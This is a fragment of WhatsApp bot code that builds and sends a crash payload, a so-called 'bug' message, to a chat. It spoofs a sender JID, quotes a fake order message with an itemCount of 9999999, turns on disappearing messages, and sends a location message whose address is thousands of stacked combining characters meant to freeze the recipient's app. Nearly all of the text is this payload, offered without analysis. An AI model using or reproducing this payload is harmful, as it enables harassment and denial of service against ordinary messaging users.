🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `ʀᴀɴᴢ`,
    orderTitle: `combine`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/logo.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: 'ʀᴀɴᴢ々ɢᴇᴍ🔥',
						address: 'ꪶ𖣂ꫂʀᴀɴᴢ   🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͝